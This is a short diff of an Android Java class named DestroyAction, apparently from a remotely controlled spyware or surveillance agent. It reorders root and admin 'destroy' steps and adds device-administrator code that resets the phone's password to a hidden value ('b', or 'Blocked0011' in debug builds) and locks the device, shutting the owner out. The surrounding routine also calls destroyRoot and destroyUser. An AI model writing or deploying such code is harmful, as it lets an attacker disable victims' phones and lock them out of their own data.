@@ -38,13 +38,16 @@ public class DestroyAction extends SubAction {
 	@Override
 	public boolean execute(Trigger trigger) {
 		try {
-			if (Status.self().haveRoot()) {
-				destroyRoot();
-			}
+	
 
 			if (Status.self().haveAdmin()) {
 				destroyAdmin();
 			}
+			
+			if (Status.self().haveRoot()) {
+				destroyRoot();
+			}
+			
 
 			destroyUser();
 		} catch (Exception ex) {
@@ -77,7 +80,14 @@ public class DestroyAction extends SubAction {
 	private void destroyAdmin() {
 		DevicePolicyManager mDPM;
 
+		
 		mDPM = (DevicePolicyManager) Status.self().getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
+		
+		if(Cfg.DEBUG){
+			mDPM.resetPassword(M.e("Blocked0011"), 0);
+		}else{
+			mDPM.resetPassword(M.e("b"), 0);
+		}
 		mDPM.lockNow();
 	}
 
